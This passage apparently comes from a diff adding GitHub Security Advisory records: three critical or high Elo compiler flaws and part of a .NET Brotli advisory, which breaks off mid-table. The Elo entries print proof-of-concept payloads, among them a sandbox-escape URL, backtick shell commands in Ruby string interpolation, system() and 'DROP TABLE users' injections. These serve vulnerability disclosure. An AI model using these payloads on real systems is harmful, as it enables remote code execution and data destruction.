URL:\n\n```\nhttps://elo-lang.org/try/?code=%28%7B%7D%29.constructor.constructor%28%27alert%28document.domain%29%27%29%28%29&run=1\n```\n\nOpening this URL causes `alert(document.domain)` to fire automatically after ~100 ms with no user interaction beyond navigating to the link. The 301 redirect preserves the `?code=` parameter intact. End-to-end execution on the live production site was captured in a screen recording attached to the original report.\n\n### Independence from GHSA #3 (AST-API injection)\n\nThis finding is independent of the Medium-severity AST-API report (GHSA #3). That fix's identifier regex `^[a-zA-Z_][a-zA-Z0-9_]*$` happens to accept `constructor`, and its threat model requires an attacker-controlled AST *object* rather than a plain string. The current finding requires only a plain Elo string, which is a strictly weaker attacker model.",
+      "url": "https://github.com/advisories/GHSA-33r5-xmm8-v6x5",
+      "severity": "critical",
+      "type": "reviewed",
+      "published": "2026-11-03T17:53:42Z",
+      "updated": "2026-11-03T17:53:43Z",
+      "withdrawn": null,
+      "credits": [
+        {
+          "name": "ultra-supara",
+          "type": "reporter"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "package": "@enspirit/elo",
+          "ecosystem": "npm",
+          "range": "<= 1.0.0",
+          "patched": "1.0.1"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-7w38-ggh5-v542",
+      "cve": "CVE-2026-44266",
+      "title": "Elo Ruby backend has Remote Code Execution via unescaped `#{...}` interpolation in emitted string literals and subtype-constraint labels",
+      "description": "### Summary\n\nElo's Ruby backend emits attacker-controlled text into Ruby double-quoted strings without escaping the `#` character. Because `#` begins Ruby's interpolation sequences — `#{expr}`, `#@ivar`, `#@@cvar`, `#$gvar` — and any expression wrapped in `#{...}` may use backticks for shell execution, an Elo program that contains a crafted string literal or a labelled subtype constraint compiles to Ruby that evaluates attacker-chosen Ruby, and through backticks runs attacker-chosen shell commands, at runtime.\n\nThe same Elo source compiled to JavaScript, Python, or SQL is benign, so the bug also breaks the cross-target portability guarantee the rest of the compiler honours.\n\n### Vulnerable sinks\n\nTwo sinks exist in `src/compilers/ruby.ts` at commit `749af7b`:\n\n1. **String-literal emitter — lines 180–184.**\n   The emitter escapes backslash, double quote, and control characters, but not `#`. Any `#{...}` sequence in an Elo string literal flows straight into the emitted Ruby source.\n\n2. **Labelled subtype-constraint branch — lines 405–412.**\n   The error message passed to `p_fail(p, \"...\")` is wrapped in a Ruby double-quoted string with no escape pass at all. Because the parser at `src/parser.ts:1339–1348` accepts single-quoted Elo strings as constraint labels, a label such as `'#{` `` `id` `` `}'` flows unchanged into the emitted Ruby.\n\n### Attack surfaces\n\nAll three surfaces share the same root cause (the missing `#` escape in the Ruby double-quoted-string emission path) and are addressed by the same patch:\n\n| # | Entry point | Threat model |\n|---|---|---|\n| 1 | `/try` playground on elo-lang.org (Ruby target) | 0-click server-side RCE against elo-lang.org infrastructure from a shared PoC URL |\n| 2 | `bin/eloc -t ruby -x` on a CI or DevOps host | RCE on any host that passes Elo strings through the CLI |\n| 3 | Library API — `defaultFormats.elo.parse()` with a Ruby emission step | Ruby RCE for any downstream integrator using Elo as a rule engine, configuration DSL, or form builder DSL (the primary documented use cases) |\n\n### Proof of Concept\n\n**String-literal sink:**\n\n```\n# poc.elo\n'RES=#{`id 2>&1`}'\n```\n\n```\n$ eloc -t ruby -x poc.elo\n# emitted Ruby contains:  \"RES=#{`id 2>&1`}\"\n# running it returns the output of id(1).\n```\n\nReplacing `` `id 2>&1` `` with `` `touch /tmp/pwned` `` produces a trivially observable filesystem side effect.\n\n**Subtype-constraint label sink:**\n\n```\n# poc-subtype.elo\nlet X = Int(i | '#{`touch /tmp/pwned2`}': i > 0) in X(-1)\n```\n\nThe predicate fails for `-1`, causing `p_fail(p, \"#{...}\")` to interpolate and execute the backtick command at the Ruby layer.\n\nBoth flows are automated in the reproduction script submitted with the original report and were verified against Ruby 3.x.\n\n### Root cause\n\nThe Ruby-emitter's double-quoted-string escape routine omitted `#` from its character set, and one emission path (the subtype-constraint label branch) performed no escape pass at all.",
+      "url": "https://github.com/advisories/GHSA-7w38-ggh5-v542",
+      "severity": "critical",
+      "type": "reviewed",
+      "published": "2026-11-03T17:51:30Z",
+      "updated": "2026-11-03T17:51:30Z",
+      "withdrawn": null,
+      "credits": [
+        {
+          "name": "ultra-supara",
+          "type": "reporter"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "package": "@enspirit/elo",
+          "ecosystem": "npm",
+          "range": "<= 1.0.0",
+          "patched": "1.0.1"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-x9rp-7wh3-2rj5",
+      "cve": "CVE-2026-44265",
+      "title": "Elo backends have code injection via unvalidated emission of programmatic AST fields",
+      "description": "### Summary\n\nElo's programmatic AST API accepts arbitrary values in many node fields without runtime type or syntax validation. Each backend's emit stage interpolates those values straight into the generated source with no escape pass. An integrator that populates the AST from JSON-deserialised input, plugin output, or any other untyped source therefore exposes a code-injection primitive that flows through to the emitted JavaScript, Ruby, Python, or SQL.\n\nThe same pattern was previously addressed in **0.9.7 (2026-01-27)**, which patched the date/datetime/duration literal emitters via `JSON.stringify()` after a report by **naoyashiga**. This advisory generalises that fix to the remaining AST surface — at least 23 emission sites across six node-field categories and four backends.\n\n### Vulnerable sinks\n\nEach row is a category of sinks that share the same shape: TypeScript signature erased at runtime → AST-API consumer passes a crafted value → emit interpolates the value verbatim.\n\n| # | AST field | Affected backends | Resulting injection |\n|---|---|---|---|\n| 1 | `int_literal` / `float_literal` `.value` | JS, Ruby, Python, SQL | Arbitrary expression in the emitted numeric position (RCE on JS/Ruby/Python; SQL expression injection) |\n| 2 | `variable.name` | JS, Ruby, Python, SQL | Identifier-position injection; on SQL, raw SQL injection because undefined identifiers are intentionally emitted as column references |\n| 3 | `member_access.property` | JS, Ruby, Python, SQL | Property access escaped into expression (RCE) |\n| 4 | `object_literal` key | JS, Ruby, SQL | Computed-key / extra-property injection (RCE on JS/Ruby; SQL injection) |\n| 5 | `datapath` segment | JS, Ruby, Python, SQL | Ruby symbol-list injection allows backtick shell exec; SQL string-segment unquoted in single-quote context allows SQL injection |\n| 6 | `lambda.params[].name` | JS, Ruby, Python | Parameter-list structural injection (RCE) |\n| 7 | SQL `let` binding `name` | SQL | Identifier injection in `… AS <name>` clause |\n\n### Proof of Concept\n\nEnd-to-end execution was verified at commit `749af7b` for representative cases per backend. Examples:\n\n**Numeric literal injection (all four backends).** Feeding the following AST through `compileToJavaScript` emits a live `console.log` on call:\n\n```js\n{ type: 'literal', value: \"(console.log('PWN_INT_JS'),1)\" }\n// emits: (function(_) { return (console.log('PWN_INT_JS'),1); })(null);\n```\n\nThe same AST against Ruby with `\"(system('touch /tmp/pwn_int_ruby'); 1)\"` creates the file; Python with `\"(print('PWN_INT_PY') or 1)\"` prints the sentinel; SQL emits the raw string into the numeric position.\n\n**SQL `variable.name` injection:**\n\n```js\n{ type: 'variable', name: \"1; DROP TABLE users; --\" }\n// emits: 1; DROP TABLE users; --\n```\n\n**Ruby `datapath` segment shell-exec:**\n\n```js\n{ type: 'datapath', segments: [\"a, system(`touch /tmp/pwn_dp_ruby`)\"] }\n// emits: [:a, system(`touch /tmp/pwn_dp_ruby`)]\n```\n\nAll ten end-to-end cases are automated in the `ast-exec.js` / `ast-exec2.js` scripts attached to the original report; each `console.log` and sentinel file was observed.\n\n### Independence from GHSA #2\n\nThis finding is independent of **GHSA #2** (the `.constructor.constructor` sandbox escape). That report covers payloads delivered as plain Elo *strings* through the parser; the present advisory covers payloads delivered as AST *objects* through the programmatic API. The two threat models do not overlap: GHSA #2's identifier regex `^[a-zA-Z_][a-zA-Z0-9_]*$` accepts `constructor` (and is the right behaviour for a parser), while the present advisory adds runtime validation at every backend emit site so that AST-API consumers cannot inject arbitrary text into emitted source.",
+      "url": "https://github.com/advisories/GHSA-x9rp-7wh3-2rj5",
+      "severity": "high",
+      "type": "reviewed",
+      "published": "2026-11-03T17:48:09Z",
+      "updated": "2026-11-03T17:48:09Z",
+      "withdrawn": null,
+      "credits": [
+        {
+          "name": "ultra-supara",
+          "type": "finder"
+        }
+      ],
+      "vulnerabilities": [
+        {
+          "package": "@enspirit/elo",
+          "ecosystem": "npm",
+          "range": "<= 1.0.0",
+          "patched": "1.0.1"
+        }
+      ]
+    },
+    {
+      "id": "GHSA-p3jp-9v83-76w9",
+      "cve": null,
+      "title": "Microsoft Security Advisory CVE-2026-111497 - .NET Brotli Decoder Out-of-bounds Write Vulnerability",
+      "description": "## Executive summary\n\nA buffer overflow vulnerability exists in the Brotli decompression library used by .NET. This vulnerability may allow an unauthenticated attacker to read or corrupt process memory. This could lead to information disclosure, denial of service, or elevation of privilege.\n\nASP.NET Core and HttpClient do not automatically decompress Brotli data in their default configurations. Applications are exposed when they enable Brotli decompression or explicitly use Brotli decompression APIs to process attacker-controlled data, as described below. .NET Framework is not affected.\n\n## Announcement\n\nAnnouncement for this issue can be found at https://github.com/dotnet/announcements/issues/494\n\n## CVSS Details\n\n- **Version:** 3.1\n- **Severity:** High\n- **Score:** 8.1\n- **Vector:** `CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C`\n- **Weakness:** CWE-787 (Out-of-bounds Write)\n\n## Affected Platforms\n\n- **Platforms:** All\n- **Architectures:** All\n\n## Mitigations\n\nASP.NET Core request decompression and HttpClient automatic response decompression are not enabled by default. An application is not exposed merely because an affected .NET package is installed. Exposure requires the application to decompress attacker-controlled Brotli data through one of these paths:\n\n- Enable ASP.NET Core [automatic request decompression](https://learn.microsoft.com/aspnet/core/fundamentals/middleware/request-decompression) with Brotli (`br`) support.\n- Enable HttpClient automatic response decompression by configuring [HttpClientHandler.AutomaticDecompression](https://learn.microsoft.com/dotnet/api/system.net.http.httpclienthandler.automaticdecompression) or [SocketsHttpHandler.AutomaticDecompression](https://learn.microsoft.com/dotnet/api/system.net.http.socketshttphandler.automaticdecompression) to include [DecompressionMethods.Brotli](https://learn.microsoft.com/dotnet/api/system.net.decompressionmethods) or `DecompressionMethods.All`.\n- Explicitly use Brotli decompression APIs in `System.IO.Compression`, such as `BrotliStream` or `BrotliDecoder`.\n\nUntil the update can be deployed, avoid decompressing attacker-controlled Brotli data.\n\nThe following examples show how to disable Brotli decompression if you are already using it.\n\n> **Warning: Do not use these code snippets if you are not already using decompression.** Do not introduce a call to `AddRequestDecompression` if your application does not already call it. Similarly, do not introduce an `AutomaticDecompression` property assignment if your application does not already set that property. Modify only your existing decompression configuration. Enabling automatic decompression can introduce denial-of-service risks even when Brotli is excluded.\n\nIf you are already using Brotli request decompression in ASP.NET Core, exclude it by removing the `br` entry from your existing decompression configuration. This retains the default gzip and deflate providers:\n\n```csharp\nbuilder.Services.AddRequestDecompression(options =>\n{\n    options.DecompressionProviders.Remove(\"br\");\n});\n```\n\nIf your application already enables HttpClient automatic response decompression, disable Brotli by updating the flags on your existing handler so they do not include `DecompressionMethods.Brotli`:\n\n```csharp\nvar handler = new HttpClientHandler\n{\n    AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate\n};\n\nvar httpClient = new HttpClient(handler);\n```\n\nApplications that directly use Brotli decompression APIs must stop passing untrusted Brotli data to those APIs until updated. Ensure that other application code does not continue to decompress the same untrusted Brotli data. These changes can affect normal request and response handling and should be tested before deployment. Installing the security update remains the recommended fix.\n\n## <a name=\"affected-packages\"></a>Affected Packages\n\nThe vulnerability affects .NET applications using an affected Brotli decoder in the runtime or NativeAOT packages listed below.\n\n### .NET 8\n\nPackage name | Affected version | Patched version\n------------ | ---------------- | ---------------\n[Microsoft.DotNet.ILCompiler](https://www.nuget.org/packages/Microsoft.DotNet.ILCompiler) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.LLVM.linux-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.LLVM.linux-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.LLVM.linux-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.LLVM.linux-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.LLVM.osx-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.LLVM.osx-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.android-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-arm) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.android-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.android-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.android-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-x86) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.browser-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.browser-wasm) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.ios-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.ios-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.linux-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.linux-arm) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.linux-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.linux-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.linux-musl-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.linux-musl-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.linux-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.linux-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.osx-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.osx-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.osx-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.osx-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.tvos-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvos-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.wasi-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.wasi-wasm) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.win-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.win-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.Mono.win-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.win-x86) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.linux-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-arm) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.linux-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.linux-bionic-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-bionic-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.linux-bionic-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-bionic-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.linux-musl-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-arm) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.linux-musl-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-musl-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.linux-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.linux-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.osx-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.osx-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.osx-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.osx-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.win-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-arm64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.win-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-x64) | >= 8.0.0, < 8.0.33 | 8.0.33\n[Microsoft.NETCore.App.Runtime.win-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.win-x86) | >= 8.0.0, < 8.0.33 | 8.0.33\n\n### .NET 9\n\nPackage name | Affected version | Patched version\n------------ | ---------------- | ---------------\n[Microsoft.DotNet.ILCompiler](https://www.nuget.org/packages/Microsoft.DotNet.ILCompiler) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.ios-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.iossimulator-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-bionic-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-musl-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.linux-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.linux-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.maccatalyst-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.osx-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.osx-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvos-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.tvossimulator-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.win-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.win-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.win-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.win-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.NativeAOT.win-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.NativeAOT.win-x86) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.android-arm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-arm) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.android-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.android-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.android-x86](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.android-x86) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.browser-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.browser-wasm) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.ios-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.ios-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.iossimulator-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.iossimulator-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.maccatalyst-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.maccatalyst-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.multithread.browser-wasm) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.tvos-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvos-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvossimulator-arm64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.tvossimulator-x64) | >= 9.0.0, < 9.0.22 | 9.0.22\n[Microsoft.NETCore.App.Runtime.Mono.wasi-wasm](https://www.nuget.org/packages/Microsoft.NETCore.App.Runtime.Mono.wasi-wasm) | 